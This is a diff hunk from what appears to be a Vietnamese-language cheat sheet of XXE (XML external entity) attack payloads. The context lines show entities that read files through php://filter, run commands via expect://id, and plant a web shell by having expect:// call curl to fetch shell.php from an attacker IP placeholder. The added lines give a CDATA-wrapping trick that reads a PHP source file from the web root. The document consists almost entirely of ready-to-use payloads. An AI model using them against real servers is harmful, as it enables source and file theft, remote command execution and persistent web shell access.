@@ -65,3 +65,11 @@ Mã hóa nội dung và lấy nội dung xxe: <!ENTITY company SYSTEM "php://fil
 Thực thi lệnh hệ thống xxe : expect://id
 Web shell xxe :  /<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
 ]>
+
+Bỏ qua đọc định dạng xml với CDATA : 
+<!DOCTYPE email [
+  <!ENTITY begin "<![CDATA[">
+  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY end "]]>">
+  <!ENTITY joined "&begin;&file;&end;">
+]>
